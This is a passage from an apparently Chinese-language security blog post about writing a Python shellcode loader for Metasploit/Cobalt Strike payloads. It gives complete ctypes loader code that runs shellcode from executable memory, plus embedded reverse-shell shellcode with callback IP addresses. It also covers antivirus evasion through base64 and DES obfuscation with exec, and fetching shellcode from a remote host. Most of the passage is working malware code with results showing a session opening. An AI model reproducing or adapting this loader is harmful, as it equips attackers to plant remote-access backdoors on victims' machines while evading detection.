class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">HANDLE</span> CreateThread(<br>LPSECURITY_ATTRIBUTES lpThreadAttributes,<span class="hljs-comment">#线程安全属性</span><br>SIZE_T dwStackSize,       <span class="hljs-comment">#置初始栈的大小，以字节为单位</span><br>LPTHREAD_START_ROUTINE lpStartAddress,  <span class="hljs-comment">#指向线程函数的指针</span><br>LPVOID lpParameter,          <span class="hljs-comment">#向线程函数传递的参数</span><br>DWORD dwCreationFlags,       <span class="hljs-comment">#线程创建属性</span><br>LPDWORD lpThreadId           <span class="hljs-comment">#保存新线程的id</span><br>)<br></code></pre></td></tr></table></figure><p>创建一个线程从shellcode放置位置开始执行</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">handle</span> = ctypes.windll.kernel32.<span class="hljs-type">CreateThread</span>(ctypes.c_int(0),<br>                                         ctypes.c_int(0),<br>                                         ctypes.c_uint64(ptr),<br>                                         ctypes.c_int(0),<br>                                         ctypes.c_int(0),<br>                                         ctypes.pointer(ctypes.c_int(0))<br></code></pre></td></tr></table></figure><table><thead><tr><th>lpThreadAttributes</th><th>为NULL使用默认安全性</th></tr></thead><tbody><tr><td>dwStackSize</td><td>为0，默认将使用与调用该函数的线程相同的栈空间大小</td></tr><tr><td>lpStartAddress</td><td>为ctypes.c_uint64(ptr)，定位到申请的内存所在的位置</td></tr><tr><td>lpParameter</td><td>不需传递参数时为NULL</td></tr><tr><td>dwCreationFlags</td><td>属性为0，表示创建后立即激活</td></tr><tr><td>lpThreadId</td><td>为ctypes.pointer(ctypes.c_int(0))不想返回线程ID,设置值为NULL</td></tr></tbody></table><h3 id="3-WaitForSingleObject"><a href="#3-WaitForSingleObject" class="headerlink" title="3.WaitForSingleObject"></a>3.WaitForSingleObject</h3><p>​    等待线程结束调用WaitForSingleObject函数用来检测线程的状态WaitForSingleObject函数原型和参数如下：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">DWORD WINAPI <span class="hljs-keyword">WaitForSingleObject(</span><br><span class="hljs-keyword">__in </span>HANDLE hHandle,     <span class="hljs-comment">#对象句柄。可以指定一系列的对象</span><br>__in DWORD dwMilliseconds  <span class="hljs-comment">#定时时间间隔</span><br>);<br></code></pre></td></tr></table></figure><p> 等待创建的线程运行结束</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">ctypes</span><span class="hljs-selector-class">.windll</span><span class="hljs-selector-class">.kernel32</span><span class="hljs-selector-class">.WaitForSingleObject</span>(                                          <br><span class="hljs-selector-tag">ctypes</span><span class="hljs-selector-class">.c_int</span>(<span class="hljs-selector-tag">handle</span>),                                          <br><span class="hljs-selector-tag">ctypes</span><span class="hljs-selector-class">.c_int</span>(<span class="hljs-selector-tag">-1</span>))<br></code></pre></td></tr></table></figure><p>这里两个参数，一个是创建的线程，一个是等待时间</p><blockquote><p>当线程退出时会给出一个信号，函数收到后会结束程序。当时间设置为0或超过等待时间，程序也会结束，所以线程也会跟着结束。</p></blockquote><p>正常的话我们创建的线程是需要一直运行的，所以将时间设为负数，等待时间将成为无限等待，程序就不会结束。</p><h3 id="4-VirtualAlloc"><a href="#4-VirtualAlloc" class="headerlink" title="4.VirtualAlloc"></a>4.VirtualAlloc</h3><p>申请内存调用VirtualAlloc函数，来申请一块动态内存区域。VirtualAlloc函数原型和参数如下：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">LPVOID</span> VirtualAlloc&#123;<br><span class="hljs-attribute">LPVOID</span> lpAddress, <span class="hljs-comment">#要分配的内存区域的地址</span><br>DWORD dwSize,      <span class="hljs-comment">#分配的大小</span><br>DWORD flAllocationType, <span class="hljs-comment">#分配的类型</span><br>DWORD flProtect     <span class="hljs-comment">#该内存的初始保护属性</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>申请一块内存可读可写可执行</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">ptr = ctypes.windll.kernel32.<span class="hljs-constructor">VirtualAlloc(<span class="hljs-params">ctypes</span>.<span class="hljs-params">c_int</span>(0)</span>,<br>ctypes.c<span class="hljs-constructor">_int(<span class="hljs-params">len</span>(<span class="hljs-params">shellcode</span>)</span>), <br>ctypes.c<span class="hljs-constructor">_int(0x3000)</span>,                                       <br>ctypes.c<span class="hljs-constructor">_int(0x40)</span>)<br></code></pre></td></tr></table></figure><table><thead><tr><th>ctypes.c_int(0)</th><th>是NULL，系统将会决定分配内存区域的位置，并且按64KB向上取整</th></tr></thead><tbody><tr><td>ctypes.c_int(len(shellcode))</td><td>以字节为单位分配或者保留多大区域</td></tr><tr><td>ctypes.c_int(0x3000)</td><td>是 MEM_COMMIT(0x1000) 和 MEM_RESERVE(0x2000)类型的合并</td></tr><tr><td>ctypes.c_int(0x40)</td><td>是权限为PAGE_EXECUTE_READWRITE 该区域可以执行代码，应用程序可以读写该区域。</td></tr></tbody></table><h3 id="5-完整测试代码"><a href="#5-完整测试代码" class="headerlink" title="5.完整测试代码"></a>5.完整测试代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">import</span> ctypes<br><br>VirtualAlloc = ctypes.windll.kernel32.VirtualAlloc<br>RtlMoveMemory = ctypes.windll.kernel32.RtlMoveMemory<br>CreateThread = ctypes.windll.kernel32.CreateThread<br>WaitForSingleObject = ctypes.windll.kernel32.WaitForSingleObject<br><br><span class="hljs-comment">#shellcode可以用msf来生成</span><br>buf = <span class="hljs-string">b&quot;&quot;</span><br><br>shellcode = <span class="hljs-built_in">bytearray</span>(buf)<br>VirtualAlloc.restype = ctypes.c_void_p  <span class="hljs-comment"># 重载函数返回类型为void</span><br>p = VirtualAlloc(ctypes.c_int(<span class="hljs-number">0</span>), ctypes.c_int(<span class="hljs-built_in">len</span>(shellcode)), <span class="hljs-number">0x3000</span>, <span class="hljs-number">0x00000040</span>)  <span class="hljs-comment"># 申请内存</span><br>buf = (ctypes.c_char * <span class="hljs-built_in">len</span>(shellcode)).from_buffer(shellcode)  <span class="hljs-comment"># 将shellcode指向指针</span><br>RtlMoveMemory(ctypes.c_void_p(p), buf, ctypes.c_int(<span class="hljs-built_in">len</span>(shellcode)))  <span class="hljs-comment"># 复制shellcode进申请的内存中</span><br>h = CreateThread(ctypes.c_int(<span class="hljs-number">0</span>), ctypes.c_int(<span class="hljs-number">0</span>), ctypes.c_void_p(p), ctypes.c_int(<span class="hljs-number">0</span>), ctypes.c_int(<span class="hljs-number">0</span>), ctypes.pointer(ctypes.c_int(<span class="hljs-number">0</span>)))  <span class="hljs-comment"># 执行创建线程</span><br>WaitForSingleObject(ctypes.c_int(h), ctypes.c_int(-<span class="hljs-number">1</span>))  <span class="hljs-comment"># 检测线程创建事件</span><br></code></pre></td></tr></table></figure><h3 id="6-使用以及效果"><a href="#6-使用以及效果" class="headerlink" title="6.使用以及效果"></a>6.使用以及效果</h3><p>先用msf生成shellcode：</p><p><img src="/2021/03/18/Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%AE%9E%E7%8E%B0-Python/1.png"></p><p>用Msf开启监听：</p><p><img src="/2021/03/18/Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%AE%9E%E7%8E%B0-Python/2.png"></p><p>在虚拟机里执行：</p><p>成功反弹meterpreter的shell：</p><p><img src="/2021/03/18/Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%AE%9E%E7%8E%B0-Python/3.png"></p><p>可以使用pyinstaller来将其打包成exe。但是没有经过免杀的话，会被windows自带的防火墙给屏蔽警告。</p><p>但是可以过了某个的安全防护软件。（自己猜）</p><h1 id="3-编码"><a href="#3-编码" class="headerlink" title="3.编码"></a>3.编码</h1><p>​    以上的测试源码在用<code>pyinstaller</code>进行打包后，会触发windows defender的病毒和威胁的警报。</p><p><img src="/2021/03/18/Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%AE%9E%E7%8E%B0-Python/4.png"></p><p><img src="/2021/03/18/Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%AE%9E%E7%8E%B0-Python/5.png"></p><p>因此我猜测是<code>VirtualAlloc</code>、<code>RtlMoveMemory</code>这些调用windows api的函数的问题。</p><h2 id="1-利用base64编码"><a href="#1-利用base64编码" class="headerlink" title="1.利用base64编码"></a>1.利用base64编码</h2><p>​    可以利用base64编码，将shellcode和以上的猜测的函数进行编码，增加绕过机会：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> ctypes<br><span class="hljs-keyword">import</span> base64<br><br>shellcode_base64 = <span class="hljs-string">b&#x27;/OiJAAAAYInlMdJki1Iwi1IMi1IUi3IoD7dKJjH/McCsPGF8Aiwgwc8NAcfi8FJXi1IQi0I8AdCLQHiFwHRKAdBQi0gYi1ggAdPjPEmLNIsB1jH/McCswc8NAcc44HX0A334O30kdeJYi1gkAdNmiwxLi1gcAdOLBIsB0IlEJCRbW2FZWlH/4FhfWosS64ZdaG5ldABod2luaVRoTHcmB//V6AAAAAAx/1dXV1dXaDpWeaf/1emkAAAAWzHJUVFqA1FRaFwRAABTUGhXiZ/G/9VQ6YwAAABbMdJSaAAywIRSUlJTUlBo61UuO//VicaDw1BogDMAAIngagRQah9WaHVGnob/1V8x/1dXav9TVmgtBhh7/9WFwA+EygEAADH/hfZ0BIn56wloqsXiXf/VicFoRSFeMf/VMf9XagdRVlBot1fgC//VvwAvAAA5x3UHWFDpe////zH/6ZEBAADpyQEAAOhv////L1JHTXYA3qAHpSBKNsHm8ge1RJ7AVBNOKSJMJC68H9m5b4RhRoQc4twwMXO1MsHoVkpSyut1glsEWaHWsBRx4gEYTT9430WqkkoCu8BucgBVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4xOyBXT1c2NDsgVHJpZGVudC81LjA7IE5QMDIpDQoAqyNDy5d/amytOgRpH1+GspqjvXg/hoXQ1/BDFHHGhfHKtFHIs5c+/NoL7UyaxupaniHaT426AYr8NQylmevvuMqxOuzfJyLCGv1KMwH5Msi6WWI1QqUHksEQcuw1ajm87RmDnZhax+K1vBJqYWw7UHMUg6CCguqwvuZBytiG/v1eg6E85lJxmneKPKavHuxwHjq3sLCyHpPcnJIB8q6FidqoLxv+0mqee8fP94Swg+300l+kIgdRgLyPJ2TTwRoUCWYxjdqyqKAB/UjQrlXjE+yh+JIAaPC1olb/1WpAaAAQAABoAABAAFdoWKRT5f/Vk7kAAAAAAdlRU4nnV2gAIAAAU1ZoEpaJ4v/VhcB0xosHAcOFwHXlWMPoif3//zE5Mi4xNjguMTk5LjI0NgBvqlHD&#x27;</span><br>shellcode = <span class="hljs-built_in">bytearray</span>(base64.b64decode(shellcode_base64))<br><span class="hljs-comment"># VirtualAlloc = ctypes.windll.kernel32.VirtualAlloc</span><br><span class="hljs-comment"># RtlMoveMemory = ctypes.windll.kernel32.RtlMoveMemory</span><br><span class="hljs-comment"># CreateThread = ctypes.windll.kernel32.CreateThread</span><br><span class="hljs-comment"># WaitForSingleObject = ctypes.windll.kernel32.WaitForSingleObject</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># VirtualAlloc.restype = ctypes.c_void_p</span><br><span class="hljs-comment"># p = VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),0x3000,0x00000040)</span><br><span class="hljs-comment"># buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)  # 将shellcode指向指针</span><br><span class="hljs-comment"># RtlMoveMemory(ctypes.c_void_p(p), buf, ctypes.c_int(len(shellcode)))  # 复制shellcode进申请的内存中</span><br><span class="hljs-comment"># h = CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_void_p(p), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))  # 执行创建线程</span><br><span class="hljs-comment"># WaitForSingleObject(ctypes.c_int(h), ctypes.c_int(-1))  # 检测线程创建事件</span><br><br><br><span class="hljs-comment">##load 变量存的是以上注释参数的base64加密</span><br>load = <span class="hljs-string">b&#x27;ClZpcnR1YWxBbGxvYyA9IGN0eXBlcy53aW5kbGwua2VybmVsMzIuVmlydHVhbEFsbG9jClJ0bE1vdmVNZW1vcnkgPSBjdHlwZXMud2luZGxsLmtlcm5lbDMyLlJ0bE1vdmVNZW1vcnkKQ3JlYXRlVGhyZWFkID0gY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5DcmVhdGVUaHJlYWQKV2FpdEZvclNpbmdsZU9iamVjdCA9IGN0eXBlcy53aW5kbGwua2VybmVsMzIuV2FpdEZvclNpbmdsZU9iamVjdAoKVmlydHVhbEFsbG9jLnJlc3R5cGUgPSBjdHlwZXMuY192b2lkX3AKcCA9IFZpcnR1YWxBbGxvYyhjdHlwZXMuY19pbnQoMCksY3R5cGVzLmNfaW50KGxlbihzaGVsbGNvZGUpKSwweDMwMDAsMHgwMDAwMDA0MCkKYnVmID0gKGN0eXBlcy5jX2NoYXIgKiBsZW4oc2hlbGxjb2RlKSkuZnJvbV9idWZmZXIoc2hlbGxjb2RlKSAgClJ0bE1vdmVNZW1vcnkoY3R5cGVzLmNfdm9pZF9wKHApLCBidWYsIGN0eXBlcy5jX2ludChsZW4oc2hlbGxjb2RlKSkpICAKaCA9IENyZWF0ZVRocmVhZChjdHlwZXMuY19pbnQoMCksIGN0eXBlcy5jX2ludCgwKSwgY3R5cGVzLmNfdm9pZF9wKHApLCBjdHlwZXMuY19pbnQoMCksIGN0eXBlcy5jX2ludCgwKSwgY3R5cGVzLnBvaW50ZXIoY3R5cGVzLmNfaW50KDApKSkgCldhaXRGb3JTaW5nbGVPYmplY3QoY3R5cGVzLmNfaW50KGgpLCBjdHlwZXMuY19pbnQoLTEpKSAg&#x27;</span><br>exec(base64.b64decode(load))<br><br></code></pre></td></tr></table></figure><p>生成后，没有再被检查出来了。</p><p><img src="/2021/03/18/Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%AE%9E%E7%8E%B0-Python/6.png"></p><p>成功上线！！！</p><p><img src="/2021/03/18/Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%AE%9E%E7%8E%B0-Python/7.png"></p><p>看起来很美好，但是上线之后就被windows defender给查出来了。</p><p><img src="/2021/03/18/Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%AE%9E%E7%8E%B0-Python/8.png"></p><p>估计是对CS的shellcode有解析识别了。。。。。。</p><h2 id="2-利用DES加密"><a href="#2-利用DES加密" class="headerlink" title="2.利用DES加密"></a>2.利用DES加密</h2><p>同base64处理的结果，因此想要绕过<code>windows defender</code>的检查，需要对CS的shellcode进行处理。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Cryptodome.Cipher <span class="hljs-keyword">import</span> DES<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> ctypes<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment"># 这是密钥</span><br>key = <span class="hljs-string">b&#x27;READERNB&#x27;</span>   <span class="hljs-comment"># key需为8字节长度.</span><br><span class="hljs-comment"># 需要去生成一个DES对象</span><br>des = DES.new(key, DES.MODE_ECB)<br><br><span class="hljs-comment">#shellcode 的解密过程</span><br><span class="hljs-comment"># buf = b&quot;\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\xe8\x00\x00\x00\x00\x31\xff\x57\x57\x57\x57\x57\x68\x3a\x56\x79\xa7\xff\xd5\xe9\xa4\x00\x00\x00\x5b\x31\xc9\x51\x51\x6a\x03\x51\x51\x68\x5c\x11\x00\x00\x53\x50\x68\x57\x89\x9f\xc6\xff\xd5\x50\xe9\x8c\x00\x00\x00\x5b\x31\xd2\x52\x68\x00\x32\xc0\x84\x52\x52\x52\x53\x52\x50\x68\xeb\x55\x2e\x3b\xff\xd5\x89\xc6\x83\xc3\x50\x68\x80\x33\x00\x00\x89\xe0\x6a\x04\x50\x6a\x1f\x56\x68\x75\x46\x9e\x86\xff\xd5\x5f\x31\xff\x57\x57\x6a\xff\x53\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x84\xca\x01\x00\x00\x31\xff\x85\xf6\x74\x04\x89\xf9\xeb\x09\x68\xaa\xc5\xe2\x5d\xff\xd5\x89\xc1\x68\x45\x21\x5e\x31\xff\xd5\x31\xff\x57\x6a\x07\x51\x56\x50\x68\xb7\x57\xe0\x0b\xff\xd5\xbf\x00\x2f\x00\x00\x39\xc7\x75\x07\x58\x50\xe9\x7b\xff\xff\xff\x31\xff\xe9\x91\x01\x00\x00\xe9\xc9\x01\x00\x00\xe8\x6f\xff\xff\xff\x2f\x52\x47\x4d\x76\x00\xde\xa0\x07\xa5\x20\x4a\x36\xc1\xe6\xf2\x07\xb5\x44\x9e\xc0\x54\x13\x4e\x29\x22\x4c\x24\x2e\xbc\x1f\xd9\xb9\x6f\x84\x61\x46\x84\x1c\xe2\xdc\x30\x31\x73\xb5\x32\xc1\xe8\x56\x4a\x52\xca\xeb\x75\x82\x5b\x04\x59\xa1\xd6\xb0\x14\x71\xe2\x01\x18\x4d\x3f\x78\xdf\x45\xaa\x92\x4a\x02\xbb\xc0\x6e\x72\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x3b\x20\x4e\x50\x30\x32\x29\x0d\x0a\x00\xab\x23\x43\xcb\x97\x7f\x6a\x6c\xad\x3a\x04\x69\x1f\x5f\x86\xb2\x9a\xa3\xbd\x78\x3f\x86\x85\xd0\xd7\xf0\x43\x14\x71\xc6\x85\xf1\xca\xb4\x51\xc8\xb3\x97\x3e\xfc\xda\x0b\xed\x4c\x9a\xc6\xea\x5a\x9e\x21\xda\x4f\x8d\xba\x01\x8a\xfc\x35\x0c\xa5\x99\xeb\xef\xb8\xca\xb1\x3a\xec\xdf\x27\x22\xc2\x1a\xfd\x4a\x33\x01\xf9\x32\xc8\xba\x59\x62\x35\x42\xa5\x07\x92\xc1\x10\x72\xec\x35\x6a\x39\xbc\xed\x19\x83\x9d\x98\x5a\xc7\xe2\xb5\xbc\x12\x6a\x61\x6c\x3b\x50\x73\x14\x83\xa0\x82\x82\xea\xb0\xbe\xe6\x41\xca\xd8\x86\xfe\xfd\x5e\x83\xa1\x3c\xe6\x52\x71\x9a\x77\x8a\x3c\xa6\xaf\x1e\xec\x70\x1e\x3a\xb7\xb0\xb0\xb2\x1e\x93\xdc\x9c\x92\x01\xf2\xae\x85\x89\xda\xa8\x2f\x1b\xfe\xd2\x6a\x9e\x7b\xc7\xcf\xf7\x84\xb0\x83\xed\xf4\xd2\x5f\xa4\x22\x07\x51\x80\xbc\x8f\x27\x64\xd3\xc1\x1a\x14\x09\x66\x31\x8d\xda\xb2\xa8\xa0\x01\xfd\x48\xd0\xae\x55\xe3\x13\xec\xa1\xf8\x92\x00\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58\xa4\x53\xe5\xff\xd5\x93\xb9\x00\x00\x00\x00\x01\xd9\x51\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xc6\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3\xe8\x89\xfd\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x39\x39\x2e\x32\x34\x36\x00\x6f\xaa\x51\xc3&quot;</span><br><span class="hljs-comment"># shellcode_base64 = b&#x27;/OiJAAAAYInlMdJki1Iwi1IMi1IUi3IoD7dKJjH/McCsPGF8Aiwgwc8NAcfi8FJXi1IQi0I8AdCLQHiFwHRKAdBQi0gYi1ggAdPjPEmLNIsB1jH/McCswc8NAcc44HX0A334O30kdeJYi1gkAdNmiwxLi1gcAdOLBIsB0IlEJCRbW2FZWlH/4FhfWosS64ZdaG5ldABod2luaVRoTHcmB//V6AAAAAAx/1dXV1dXaDpWeaf/1emkAAAAWzHJUVFqA1FRaFwRAABTUGhXiZ/G/9VQ6YwAAABbMdJSaAAywIRSUlJTUlBo61UuO//VicaDw1BogDMAAIngagRQah9WaHVGnob/1V8x/1dXav9TVmgtBhh7/9WFwA+EygEAADH/hfZ0BIn56wloqsXiXf/VicFoRSFeMf/VMf9XagdRVlBot1fgC//VvwAvAAA5x3UHWFDpe////zH/6ZEBAADpyQEAAOhv////L1ZHc0wAYFXWDFdwU7W7NPcLdNrMWSGoVw0vImEed3AZxizIiRR3tU6CVQakF9VnMI5mswjZeUCyB0b1CoIPx03LvYA+qyqkHdxkKabjOwBVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4xOyBUcmlkZW50LzUuMDsgVUhTKQ0KADtfAiBfmAIdMXRitOvZCJjiEb9NIwfHmxCppeLBAe3nvoGI+NX+lDUbKDAOudEGMEC0cdOTVRavOnRLdjaF4ZK8l6+Ssx2AWTlelLK9l0ZVuamoldfoPgngWgcwDC6zG6vkL9CjCUwIYmFIGXSQD3m6lopnl1gVIhq5SiVPuAolLo0h1Q69QAn9ELpB37Weh0urNOYhMwZuXYuc4ZrUZ6YEfCKBpL87ZaZzUQcF7/D5Bo5xWkzvZJIK1Yqq0ZOPUdB5XcdmccZ/5ZHU0bAvESeFFVwO8q0M5qpj17IAaPC1olb/1WpAaAAQAABoAABAAFdoWKRT5f/Vk7kAAAAAAdlRU4nnV2gAIAAAU1ZoEpaJ4v/VhcB0xosHAcOFwHXlWMPoif3//zQ5LjIzNC4yMzIuMjQwAG+qUcM=&#x27;</span><br><span class="hljs-comment"># 采用分离结构，从远程计算机获得shellcode。</span><br>shellcode_base64 = requests.get(<span class="hljs-string">&#x27;http://192.168.199.246:6666/shellcode.txt&#x27;</span>).content<br>shellcode = <span class="hljs-built_in">bytearray</span>(base64.b64decode(shellcode_base64))<br>print(shellcode_base64)<br><span class="hljs-comment">#加载器解密过程</span><br>encryptResult = <span class="hljs-string">b&#x27;511fdcaf5f833932fa8850d74b65f92083b08ed5ebe867dc997ccfb5aea72fa7f59ec9926a0c0a5d77d926f4203c8318de611bd31c5f45f947012f48ad9a9a2b8c3703f6de3675d93503f00b8313f48696608dfa66c10df8ba03d1c4fa424c0375336d18e3bd00ccdc65dcb4a0f8af39567b3123e9577cac83b08ed5ebe867dc997ccfb5aea72fa73602c9ccba5945f2eac57e7a173a42aa5635586685e37c8ebe80670e027b0bfef0223e8e0358a88e5a9d393274024d5440d594243f4f76f9473b2d58e00e2359594e5b6ffdb4993af2f69dd9cc17b2cf46feaa16fb022d7a010411fe308411d4663940259e519231eec948e90a7edffbe267000f11119198edda41df089f7265da2d8dde2cd8ca339ca2eff8e2c5e79a23d805899312c0c6eb44fc89e416f77c23d805899312c0c69d15095d4af21a001eccb21618e29ccf253eca607db8e4bcc4f8c15114422743af1cd354012e13c07c19c224f0086881a20202a11bec108e488a50c4169494232835c86ce86be1826b23ea860f97c2774da38a9586a48b342835c86ce86be1827dbf3c1d347db3984443588d77e82ec9343f5603a4e4577c75c6ba8b11f00cca5b95839dc68781640a575ab58b17b101b2d1f6c2bb49c665136a2845677fc6897f90fa1cc52d94c8f3d73c5753234ea8d223d6fb46867c2ba6ada5be55b5996923d805899312c0c6944eaacfb33f2514326534e35521feaad71c92fde9d84a1af38ec165ff297f0e597926c05a400c511baefefe131e986de8f63f998277a1c70bd6a1ef503a0fafb2d1f6c2bb49c6653b9f9b24e84a1ef4148c7f1cf850eb33c4c2b515702f5975b2d1f6c2bb49c66558837586d1ad0dc6f162fa9c888ad75c903115652bc3be0cdff892620f69c45ae8f63f998277a1c7ef8edc960145dc19b2d1f6c2bb49c665564fdc799a2d56e5173058af76dc2dbd&#x27;</span><br>encrypto_text = binascii.a2b_hex(encryptResult)<br>decryptResult = des.decrypt(encrypto_text)<br>exec(decryptResult)<br></code></pre></td></tr></table></figure><h1 id="4-利用反序列化"><a href="#4-利用反序列化" class="headerlink" title="4.利用反序列化"></a>4.利用反序列化</h1><p>将下面的脚本的输出的数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> ctypes<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> codecs<br><span class="hljs-keyword">import</span> pickle<br>shellcode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">shellcode = requests.get(&#x27;http://192.168.199.246:6666/shellcode.txt&#x27;).content</span><br><span 